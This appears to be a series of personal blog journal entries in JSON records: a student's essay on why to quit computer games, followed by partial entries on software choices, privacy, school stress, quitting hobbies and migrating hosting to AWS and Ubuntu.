{"title": "The Pros and Cons of Playing Computer Games (and Why I Should QUIT)", "date": "Thu Oct 13 2022 14:10:02", "type": "journal", "body": "<h2 id=\"the-pros-of-playing-computer-games\">The Pros of Playing Computer\nGames</h2>\n<h3 id=\"no\">NO!!!!!!!!!!!!</h3>\n<h2 id=\"the-cons-of-playing-computer-games\">The Cons of Playing Computer\nGames</h2>\n<h3 id=\"gain-nothing\">Gain nothing</h3>\n<p>Out of doing all activities, one gains nothing playing computer\ngames. I can learn about other people\u2019s lives, experiences, knowledge\nabout life reading books. I can learn about math and computer science\nwatching YouTube. Exercising can help build my body and relax. Doing\nhousework can help me feel comfortable. However, computer games have\nnone of these effects.</p>\n<p>Computer games require little skill to understand and play. They are\nsimple and boring\u2013everybody is alike in the game. You cannot learn\nanything by playing computer games.</p>\n<h3 id=\"time-consuming\">Time consuming</h3>\n<p>Computer Games result in wasting much of my spare time. What\u2019s more,\nI always play more than I intend to. For example, once I started playing\n\u201czombsroyal\u201d, I usually can\u2019t stop and keep on playing for four hours.\nComputer Games are simply too addicting, their effects just like drugs.\nOne can easily spend an entire day doing nothing and playing computer\ngames, and not even noticing time passing. I have just so much more time\nto do other things if I quit computer games.</p>\n<p>Some people might argue that \u201che is just tired,\u201d or he can\u2019t do\nanything much in these hours besides playing computer games. This sounds\nvery strange and absurd. When I am playing video games, my brain is\nstill doing work\u2013when I am playing \u201cgenerals\u201d or \u201c2048\u201d, I am always\nthinking about the strategies and how to win. A really tired person\ncan\u2019t play video games. Just taking a walk in the park, or reading a\nliterature book, or watching an inspirational video on YouTube, which\nusually takes about only 1 hour or less, one can easily put the time to\nuse!</p>\n<h3 id=\"long-recovery-period\">Long Recovery Period</h3>\n<p>After I play computer games, I always feel dizzy and disoriented\u2013I\nneed to rest and cannot go straight back to my work. However, when I\nfinished walking, or reading English books, or sleeping, I go back to\ndoing math fully refreshed. Playing computer games consumes not only the\ntime one spends looking at the screen, but also puts one in a\ndysfunctional state long after finishing. I cannot go back to studying\nafter playing video games. In fact, usually the whole day is wasted.</p>\n<h3 id=\"sleeping-trouble\">Sleeping trouble</h3>\n<p>Playing games brings excitement. Playing games at night may affect\none\u2019s sleep. Sometimes game addicts will stay up to 12:00 pm to play\ngames, which causes significant distress the next day. Sleeping is\nreally important to one\u2019s well-being, and one\u2019s efficiency of learning\nmath and computer science.</p>\n<h3 id=\"harmful-to-eyes\">Harmful to eyes</h3>\n<p>Since computer games are so addicting, one usually spends so much\ntime looking at the screen without even blinking, which can be very\nharmful to one\u2019s eyes. My eyes on August 2022 are 0.8 and 0.6, which\naren\u2019t very good. I should really take the matters seriously. Other\ncomputer activities, like coding or watching YouTube, don\u2019t require one\nto keep his eyes open all the time, leading to a less harmful effect on\nthe eyes. Doing outdoor activities are very good for the eyes,\nespecially after sitting in the classroom all day long.</p>\n<h3 id=\"harmful-to-health\">Harmful to Health</h3>\n<p>When I play games, I usually sit rigid for hours. I don\u2019t drink water\nor go to the bathroom, which can have a negative effect on the body.</p>\n<h3 id=\"getting-isolated\">Getting Isolated</h3>\n<p>Since playing games is something I can enjoy alone, I usually isolate\nmyself from society when playing video games. Thus, playing games stop\nme from making friends and communicating with my schoolmates\neffectively.</p>\n<h3 id=\"meaningless-life\">Meaningless life</h3>\n<p>Since games are immersive and addictive, one may easily forget about\nlife altogether after spending much time on games\u2013real life doesn\u2019t\nmatter that much, compared to the game. Instead of challenging and\ntrying to go through the difficulties\u2013tests, homework, competition, one\ntends to avoid and find a way of escaping, always into a game. One may\nconsider the game as an exit to all the sorrows and real hardships in\nlife. However, these problems always exist, and simply won\u2019t go away.\nThus, one adopts a negative attitude towards life and sneaks himself\naway from it. One will also turn a blind eye to his relatives or\nfriends. Since the game is meaningless, one\u2019s life is meaningless as\nwell.</p>\n<h3 id=\"inappropriate-behavior\">Inappropriate behavior</h3>\n<p>After playing gun games, one will sometimes try out the actions used\nin the games. One may constantly think about fighting\u2013committing crimes\nand murdering\u2013instead of studying math and computer science. Sometimes\ngame addicts don\u2019t like to sit down in a classroom and study math\nbecause they are too restless. Sometimes game addicts adopt the same\nkind of behavior towards his classmates, which leads to violent\nbehaviors and him being hated by all. Since there are usually those\nstrange sounds in games, one may choose to imitate them after playing\ntoo much. As a result, one may constantly speak profanity (words like\ndamn) and curse others. This is very inappropriate behavior, considered\nuncivilized and uneducated.</p>\n<h3 id=\"limited-ability\">Limited ability</h3>\n<p>Since games are simple and human reaction speed is limited, computer\nprograms can easily outplay human players. You can just never win a very\ngood computer program in a game. Spending more time studying machine\nlearning and computer science can bring about far more success in video\ngames. Thus, it is meaningless (everything is limited by the game-maker\nand players are manipulated) to play computer games yourself.</p>\n<h3 id=\"distracting-others\">Distracting others</h3>\n<p>Playing games usually includes a lot of mouse clicking or exclaiming,\nwhich can really disturb other students around you who are trying to do\nmath. The music in games and the flashing light also make people feel\nrestless. This is really annoying to others who are trying to do\nhomework.</p>\n<h2 id=\"why-i-should-quit\">Why I Should QUIT</h2>\n<p>It is obvious from the reasons above that the cons outweigh the pros.\nAt the same time, I obtain much more advantage from doing other\nactivities.</p>\n<h3 id=\"another-approach-to-the-pros\">Another Approach to the Pros</h3>\n<h4 id=\"helps-forget-things\">Helps forget things</h4>\n<p>Try sleeping at 8, or 7 pm at night.</p>\n<h4 id=\"instant-reward\">Instant reward</h4>\n<p>One really doesn\u2019t need to fill his brain with dopamine all day long.\nBeing excited causes multiple troubles for the brain itself.</p>\n<h4 id=\"react-faster\">React Faster</h4>\n<p>One really doesn\u2019t need to react faster to solve problems. Instead,\none should think deeply and thoroughly, and dedicate one\u2019s mind to the\nknowledge in order to do that.</p>\n", "_id": "66689636547d3fe098118774"}

For instance, I need to use phones, or\nelse I will have difficulty surviving in this world nowadays.</p>\n<p>But anyway, I decided to take a small step towards Open Source &amp;\nSecurity.</p>\n<h3 id=\"how\">How?</h3>\n<p>So basically almost all my applications on the computer(archlinux)\nare open source now, I made this switch.</p>\n<p>Google Chrome -&gt; Chromium<br />\nVS Code -&gt; OSS Code<br />\nGoogle -&gt; DuckDuckGo<br />\nYouTube -&gt; Invidious<br />\nMSOffice-&gt; OnlyOffice</p>\n<h3 id=\"crappy-social-media\">Crappy Social Media</h3>\n<p>Then I decided to almost completely stop using Twitter, Reddit,\nDiscord, Telegram. The reason is that there are no healthy things on\nTwitter and no knowledge of all of them. Twitter is just a toxic and\nmalicious area filled with adult content and nothing useful. Similarly\nReddit and Telegram is filled with adult content, addictive and toxic,\nvery unhealthy, and full of garbage. Discord is boring and full of\ngaming, like full of rubbish. The only reason I am still using Instagram\nis because some people I follow are on Instagram, but then I decided to\nonly use Instagram on my phone since I think it is more of a phone app.\nSocial media is just bad for me.</p>\n<h2 id=\"things-with-no-alternatives\">Things with no Alternatives</h2>\n<p>Gmail has no alternative since it is the Berkeley mail and I must use\nthat.</p>\n<p>Some very crappy Chinese software cannot be replaced after I go back\nto China.</p>\n<h2 id=\"updates-2024.6\">Updates 2024.6</h2>\n<p>These days I value simplicity and practicality.</p>\n<h2 id=\"fine-with-proprietary-software\">Fine with Proprietary\nSoftware</h2>\n<p>I have no problems with proprietary software because they are\nunavoidable and many of them are superior, and avoiding them only makes\nmy life harder. However those proprietary software still need to respect\nthe user to a certain extent. There is no point in avoiding Google\nChrome and established platforms like social media.</p>\n<p>Besides companies need to earn money and it is reasonable if they are\nhiding some competitive edges in their code.</p>\n<h2 id=\"more-of-a-hobby\">More of a Hobby</h2>\n<p>Many of those things, e.g., device exploration, niche open source\nsoftwares, are more of a hobby than an actual daily use case. Some of\nthem have slow speeds, and not modern practices.</p>\n<p>They can be very interesting hobbies, however, most situations our\ntimes are more important and can be utilized to do other things, and\nthey are mostly not suited for daily usage.</p>\n<p>For example, if you tinker with Linux too much, you may risk bricking\nthe system. I bricked my system at least 3 times, either when the boot\npartition got corrupted or the fstab got misconfigured. It is awfully\nfrustrating and not constructive in daily life.</p>\n<h2 id=\"security-and-privacy-does-it-matter\">Security and Privacy, Does\nit Matter?</h2>\n<p>I realized I don\u2019t really care about my security and privacy that\nmuch. There is no point in avoiding YouTube or Gmail intentionally as\nthey are still the best platforms out there. Practicality, in fact, is a\nfar more important concept.</p>\n<p>People\u2019s information is everywhere with a click, especially in the\nUnited States. Go to any people\u2019s search platforms and you can see\npeople\u2019s addresses and phone numbers, it is just insane how much\ninformation is already leaked. Someone with a Python bot can crawl\nmillions of people and addresses from these websites, and even if you\ntake them down or hide them from public view, they are still there.</p>\n<p>Moreover, my passwords are already stored safely in KeePass, and one\nplatform breaching them doesn\u2019t leak my other platform\u2019s randomly\ngenerated long unguessable passwords.</p>\n<p>As for privacy or data, it doesn\u2019t matter if companies sell them or\nnot because most of them are already available anyway, and for a person\nvoid on social media, I don\u2019t get a lot of advertising.</p>\n<p>I appreciate Google because it gives so much free space and YouTube\nis so free, not charging anything for its CDN costs. I would be willing\nto pay for YouTube for the CDN and bandwidth cost, though. That said,\nGoogle is also an optional platform and doesn\u2019t force everybody to use\nit. These big companies are pioneers in open-source projects(except\nApple it seems). Without these top companies designing excellent open\nsource projects, my life would be a lot harder though.</p>\n<p>So called \u201cprivate DuckDuckGo\u201d browser went down when Bing\u2019s API had\na problem, so it implies DuckDuckGo relies heavily on Bing for search\nresults, and that implies it is not that private anyway.</p>\n<p>I don\u2019t blindly use any Google Service but it is a very great tool.\nGoogle Docs or Slides are the most convenient office suits out there.\nThey can even be used offline in a browser.</p>\n<p>After all, sticking to strict open source guidelines won\u2019t improve my\ntech skills, just very niche things isolating me more from the society I\nam already isolated from.</p>\n<p>Moreover, in China, the government knows all about your data.</p>\n<p>Companies selling my data don\u2019t endanger me in any way, as I am just\na regular person. I would, of course, avoid plain-word passwords or\nplain-word bank accounts or identification numbers.</p>\n<p>Maintaining a practical approach instead of debating about what is\nideal is very beneficial.</p>\n<h2 id=\"why-dont-i-use-some-services\">Why Don\u2019t I Use Some\nServices?</h2>\n<p>I don\u2019t use some services not because they are proprietary. I was\nmistaken in my previous approach and I am now emphasizing the utility. I\nam not using some services because of other reasons.</p>\n<p>I don\u2019t use some social media because they feel overwhelming not\nbecause they are proprietary. Similarly, I also quit Mastodon and\nPixelfed from Fediverse, as they contain views that are too polarizing\nand not constructive.</p>\n<p>I don\u2019t like TikTok not because of privacy reasons but because I just\ndon\u2019t like short videos, people can have choices and preferences.</p>\n<p>There are, however, still some services I might not be contented\nwith. For example, BaiduNetDisk requires downloading a client to\ndownload any files(which in turn not only bloats the system but always\nshows a floating icon, which I find annoying). It simply doesn\u2019t respect\nthe user. BaiduNetDisk also restricts the free tier downloading speed to\n50 KB per second, absolutely ridiculous and egregious behavior from the\ncompany. I thought the network speed depends on my Internet\u2019s bandwidth\nand the Company\u2019s server\u2019s bandwidth, and it lacks transparency and\nrespect for its users.</p>\n<p>Similarly, I really dislike CSDN because it hides the copy paste\nfunctionality with some stupid Javascript intentionally, forcing users\nto log in. These acts doesn\u2019t benefit the company but forces the users\nto pay or log in. Copying code can be done easily from the browser debug\nconsole anyways. They simply disregard the need to benefit the users,\ninstead, focusing on maintaining a dictatorship and autonomy, without\nactual benefits or superior quality, which makes me annoyed.</p>\n<p>I don\u2019t use Proton anymore because the bridge is too hard to\nconfigure, forcing the user to stick to the Proton Mail Client when\nusing it. Furthermore, Proton is also proprietary. While popular and\noverall a very good app, it provides no advantage over Gmail.</p>\n<h2 id=\"why-dont-i-use-windows-now\">Why Don\u2019t I use Windows now?</h2>\n<p>I don\u2019t use windows not because it is proprietary. I like the Google\nServices on Android though, which are proprietary too. I dislike Windows\nbecause it isn\u2019t ideal for development and lacks a good package manager,\nhides too much things through GUI. I don\u2019t know what is going on down\ninside it and using Ubuntu is just faster. I went back to Ubuntu simply\nbecause the usage experience is almost the same for me as ArchLinux, I\ndon\u2019t notice any difference except package management, in which case I\nadd debs instead of using AUR. I use Ubuntu primarily because most\nservers use Ubuntu, giving me a seamless transition between my laptop\nand servers, and in turn, making my life easier.</p>\n<h2 id=\"about-recall\">About \u201cRecall\u201d</h2>\n<p>I don\u2019t like the idea of Microsoft Recall which takes screenshots\nevery few seconds, not because it is a leak of privacy or security\nbreach, but because I find it unnecessary, and doing so probably makes\nmy battery consume more power.</p>\n<p>That said, I am still very enthusiastic about the SnapDragon Elite\nChip, and if I can run Linux on it seamless I would be willing to use\nthat.</p>\n<h2 id=\"why-dont-i-use-apple\">Why Don\u2019t I use Apple?</h2>\n<p>I don\u2019t like Apple not because it is proprietary. In fact, I do like\nApple\u2019s interface. Apple has so called \u201cclean\u201d and \u201cminimalistic\u201d\ninterface and style.</p>\n<p>I don\u2019t like Apple because it always create a mysterious or magical\natmosphere with its products, usually causing confusion to me.\nFurthermore, I bricked every Apple device I got with either jailbreaking\nor removing the recovery shell.</p>\n<p>I value utility, ease of use, and actual transparency, basically\n\u201cuser\u2019s freedom and flexibility\u201d, on the products I use, which Apple\nfails to address(being a walled garden). You can\u2019t even run MacOS on non\nMac devices(or some people might but it\u2019s not a wide practice)</p>\n<h2 id=\"toxicity-in-open-source-community\">Toxicity in Open Source\nCommunity</h2>\n<p>There is often a \u201ctoxic\u201d superiority in open source community that\ngoes like \u201cI am superior than you because I use open source\u201d, but\nactually meaningless. Some people believe they are superior because they\nuse \u201cArchLinux\u201d, which isn\u2019t quite true. While ArchLinux usually\nrequires some command line proficiency to install, Ubuntu can also be\ninstalled via command line and tinkered extensively. There is no\nsuperiority between operating systems and only utility and widespread\nusage.</p>\n<p>That said, these people neither represent the open source community\nnor does that implicate that open source community is toxic as a whole.\nIn fact, I find many people very friendly and constructive. Open source\ncommunity was the reason I got interested in technology, and I would be\nforever grateful for it leading me in the early days I studied\ncomputer.</p>\n<p>In fact, Microsoft contributed so much to the open source community,\nincluding VSCode and Typescript, which are essential tools for today\u2019s\ndevelopement. Downplaying big company\u2019s contributions for niche\napplications is wrong.</p>\n<h2 id=\"conclusion\">Conclusion</h2>\n<p>Basically these things are part of my guidelines at least for now</p>\n<ul>\n<li>Superiority and Practicality</li>\n<li>Flexibility and Freedom</li>\n</ul>\n<p>In the end it\u2019s all about personal choices.</p>\n", "_id": "66689636547d3fe098118775"}

This hobby\nis just useless and not contributing to anything practically, moreover,\nit\u2019s time consuming. I ust want to settle with a modern device and I\nmean that\u2019s it.</p>\n<p>I am not gonna try out distros like BSDs or whatever unless necessary\nbecause it\u2019s just not really useful anyways. However, there is\ndefinitely still many things to learn in <code>W!ndow$</code>, probably\ntaking more than 30 years if I decide I gonna get used to them, and it\nis by far the most complicated os out there. Like literally by trying to\n\u201chide\u201d complicated things through a UI makes things far more complicated\nthan they already are. Using <code>W!ndow$</code> scares me and it\nalways have tons of bugs.

All the complicance and\nfear of school backslashed on me so hard especially starting this\nsemester I just don\u2019t find any motivation.</p>\n<p>Also, I wasn\u2019t fine at all in freshman year(so wasn\u2019t I fine now),\nand people thinking I don\u2019t have a mental problem back then doesn\u2019t care\nabout my mental health(which, I don\u2019t mind because people shouldn\u2019t care\nabout me anyways), but the fact that people are forcing stuff on me is\njust downright humiliating.</p>\n<p>I was so tired and anxious and burned up and in every way in freshman\nyear and gotten into a very bad state indeed. I was one step from\nbreaking down all the time. I couldn\u2019t bear it anyways but this semester\nseem more bearable when I do more things I wanted.</p>\n<p>This whole brainwashing in school definitely made me gloomy, but I\ndon\u2019t know if quitting hobbies is making me glommy or not. I was having\nan abnormally small numbers of hobbies compared to a healthy individual,\nbut that doesn\u2019t say anything because I also have a very very\nminimalistic lifestyle and I am fine with pretty much everything(or just\neverything) in life like what I eat and what I use and I am not picky on\nalmost everything, clothing, climate, you name it (except wanting to\nlive <em>quietly</em> alone in a bedroom instead of a dorm).</p>\n<p>So the conclusion is school makes me sad, not necessarily quitting\nhobbies. The real cause is being trapped in a school and having people\ntelling me what I need to do without autonomy or freedom.</p>\n<h2 id=\"do-i-actually-want-to-quit-hobbies\">Do I actually want to Quit\nHobbies</h2>\n<p>Yes, most of the time. Sad, but true, as I am a very minimalistic\nperson, with or without school.</p>\n<h2 id=\"migrating-to-aws\">Migrating to AWS</h2>\n<p>So I finally made the decision to migrate everything to AWS,\nliterally like Linode and Cloudflare and Pikapod and Runpod and VastAI\nto AWS.</p>\n<p>I also quit Proton Mail and settles with Gmail free tier.</p>\n<p>Basically on AWS they let you manage all your stuff in a single\nconsole. Also migrating to aws gives a experience of working in an\nenterprise literally with so many configuration options like scaling\nthings up and down.(using aws cloud utils to quickly configure the ram,\ndisk usage). It was awesome.</p>\n<h2 id=\"how-much-money-did-i-waste\">How much money did I waste?</h2>\n<p>I wasted a lot of money. At least 11 month of Proton Mail\nSubscription, 40 dollars in Linode, 40 dollars in PikaPod, 10-20 dollars\nin Runpod and VastAI, 25 dollars transferring the domain to AWS.</p>\n<p>But then again, it was worth like experiencing things, but I would\nknow better not to put money in those though.</p>\n<h2 id=\"vendor-lock-in\">Vendor Lock in?</h2>\n<p>No that\u2019s for enterprise. I can migrate stuff to azure quickly as\nwell, or GCP(if Google can process the billing lol)</p>\n<h2 id=\"going-back-to-ubuntu\">Going Back to Ubuntu</h2>\n<p>Yes! I am going back to Ubuntu! Though I might still use ArchLinux\nsometimes. This might sound, sad.</p>\n<p>Why? Obviously because Ubuntu runs in servers. Literally like all the\ndocker images or Machine learning environments you can find online is\nUbuntu, and it runs like 30 percent of Internet or whatever.\nSurprisingly Ubuntu is much more popular in servers, and by using Ubuntu\nI don\u2019t have to transition between my laptop and the server.</p>\n<p>Well obviously don\u2019t instlal the <code>ubuntu-desktop</code> and just\ninstall the ubuntu server image on canonical\u2019s website and boot into a\ncli, then use a configuration file and Network Manager to connect to\nInternet, change the mirror, then update and upgrade, and install the\ngdm and vanilla gnome. Moreover configure the theme to be cantarell and\ndisable crappy snap and things are good enough.</p>\n<p>I don\u2019t think there are much differences in using experience between\nUbuntu and ArchLinux though. just with a different package manager, and\nusing debs or AUR.</p>\n<p>Given that Ubuntu already runs well in AWS t4, I won\u2019t be surprised\nif they run well on the Snapdragon Elite chips.</p>\n<h2 id=\"wayland-issues\">Wayland Issues</h2>\n<p>This might seem unrelated but wayland has issues with vscode and the\nmouse, so I went back to xorg. This also seem evident as my old system76\nlaptop was also having issues with its mouse lately(obviously after\nswitching to wayland).</p>\n<h2 id=\"ethical-concerns\">Ethical Concerns?</h2>\n<p>I still like open-source, but using open source for everything is\nimpractical and idealistic and I don\u2019t see the point of it when\nliterally I face far more restrictions in my life. Open source softwares\nare a tool for me to quickly know about things and I appreciate them,\nhowever, those big companies aren\u2019t evil and did open source many of the\nbest tools too, so I don\u2019t see a problem using their proprietary\nsoftwares as well(long as I know how to use it).</p>\n", "_id": "66689636547d3fe098118776"}
